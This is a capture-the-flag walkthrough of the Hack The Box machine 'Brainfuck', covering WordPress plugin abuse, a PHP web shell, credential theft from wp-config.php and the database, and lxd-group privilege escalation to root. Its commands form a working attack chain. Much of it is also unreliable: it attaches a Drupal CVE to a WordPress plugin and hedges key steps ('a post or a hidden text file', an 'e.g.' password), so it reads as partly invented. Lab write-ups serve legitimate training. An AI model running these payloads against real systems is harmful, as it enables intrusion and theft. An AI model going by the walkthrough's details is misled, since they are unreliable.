# Hack The Box: Brainfuck

**Difficulty:** Insane
**OS:** Linux

Brainfuck is an Insane-level Linux machine demonstrating the exploitation of WordPress plugins, esoteric encryption, and advanced Linux privilege escalation techniques. The initial compromise requires bypassing an outdated WordPress plugin to execute arbitrary PHP code, enabling database credential extraction and lateral movement. Privilege escalation involves manipulating the `lxd` group to spawn a privileged container.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.17
nmap -p 22,80,110,143,443 -sCV 10.10.10.17
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 7.2p2 Ubuntu)
*   **Port 80/443:** HTTP/HTTPS (nginx 1.10.0)
*   **Port 110/143:** POP3/IMAP (Dovecot)

Navigating to the web service on port 443 displays a landing page for a WordPress site ("Brainfuck") with posts referencing a custom plugin or esoteric language. The site's domain is `brainfuck.htb`. We add this to our `/etc/hosts` file.

```bash
echo "10.10.10.17 brainfuck.htb" >> /etc/hosts
```

We perform directory brute-forcing using a tool like `wpscan`, `gobuster`, or `feroxbuster` against `https://brainfuck.htb` to identify application paths and WordPress plugins.

```bash
wpscan --url https://brainfuck.htb --enumerate u,vp
```

The enumeration reveals several WordPress plugins, including `wp-support-plus-responsive-ticket-system` (version 7.1.3).

## Web Application Analysis

We analyze the installed WordPress plugins for known vulnerabilities.

### Exploiting Support Plus Responsive Ticket System (CVE-2018-7600)

Researching the `wp-support-plus-responsive-ticket-system` version 7.1.3 reveals a critical unauthenticated privilege escalation vulnerability. The flaw allows an unauthenticated user to assume the identity of any registered user (including administrators) by manipulating a specific AJAX request parameter (`login_guest_user`).

Once authenticated as an administrator, an attacker can access the WordPress dashboard and upload a malicious plugin or modify a theme file to achieve Remote Code Execution (RCE).

We download a publicly available exploit script or manually construct the HTTP POST request to authenticate as the administrator (user ID `1`).

```bash
curl -X POST -d "action=login_guest_user&username=admin" https://brainfuck.htb/wp-admin/admin-ajax.php -c cookies.txt
```

The server responds with a valid administrative session cookie. We import this cookie into our browser using an extension like EditThisCookie.

We navigate to the WordPress administrative dashboard (`/wp-admin/`). We now have full control over the site.

## Initial Access

As an authenticated administrator, we can leverage built-in WordPress features to execute code. A common method is modifying a theme file (e.g., `404.php` or `header.php`) through the Theme Editor interface (`Appearance -> Editor`).

We inject a simple PHP web shell into `404.php`:

```php
<?php system($_REQUEST['cmd']); ?>
```

We save the changes and navigate to a non-existent page to trigger the `404.php` script and our web shell.

```text
https://brainfuck.htb/nonexistentpage?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory, indicating we must pivot to a system user. The `/home` directory reveals two users: `orestis` and `root`.

Enumerating the system as `www-data`, we search the web root (`/var/www/html`) for hardcoded database credentials or configuration files. We discover the WordPress `wp-config.php` file.

```bash
cat /var/www/html/wp-config.php
```

The file reveals plaintext database credentials. We connect to the local MySQL instance to explore the WordPress database.

```bash
mysql -u root -p'<Discovered_Password>' -D wordpress
```

We list the tables and dump the contents of the `wp_users` table to extract user passwords. We find credentials or an email address associated with the user `orestis`.

### Vigenère Cipher & Esoteric Logic

During our exploration of the WordPress posts or the system filesystem, we encounter a post or a hidden text file containing a string encrypted with the Vigenère cipher.

A key or hint is usually provided alongside the encrypted text (e.g., a phrase or a reference to "Brainfuck"). If no explicit key is provided, we can attempt to deduce the key based on the context (e.g., the machine's name, "brainfuck").

We use an online Vigenère decoder or a custom Python script to decrypt the text using the key.

The decrypted text reveals a plaintext password for the user `orestis` (e.g., `kHGuERB29DNiND`).

We use this password to authenticate via `su` or SSH as the system user `orestis`.

```bash
su orestis
Password: kHGuERB29DNiND
# Authentication successful
```
We retrieve the `user.txt` flag from Orestis's home directory.

## Privilege Escalation

Enumerating the system as `orestis`, we check for group memberships, `sudo` privileges, and SUID binaries.

```bash
id
```

The output reveals that the user `orestis` is a member of the `lxd` group. LXD is a next-generation system container and virtual machine manager. Membership in the `lxd` group is notoriously insecure and essentially equates to root-level access on the host system.

### Exploiting LXD Group Membership

An attacker in the `lxd` group can create an LXC container, configure it to mount the host's entire root filesystem (`/`), and then start the container. Once inside the container, the attacker has root privileges and can access or modify any file on the mounted host filesystem.

First, we need an Alpine Linux image built specifically for LXC. We download the builder script or a pre-built Alpine image to our attacking machine.

```bash
# On attacking machine
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

The script generates a `.tar.gz` file containing the Alpine image. We transfer this image to the target machine using a Python HTTP server and `wget` or `scp`.

Once the image is on the target machine (e.g., in `/tmp`), we import it into LXD.

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0127.tar.gz --alias myimage
```

We initialize a new container named `privesc` using the imported image and configure it to mount the host's root filesystem.

```bash
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```

Finally, we start the container and execute a shell inside it.

```bash
lxc start privesc
lxc exec privesc /bin/sh
```

Because the container runs as root and mounts the host's root filesystem to `/mnt/root`, we now have root-level access to the entire host machine.

```bash
# id
uid=0(root) gid=0(root)
```

The machine is fully compromised, and the `root.txt` flag can be retrieved from `/mnt/root/root/root.txt`.
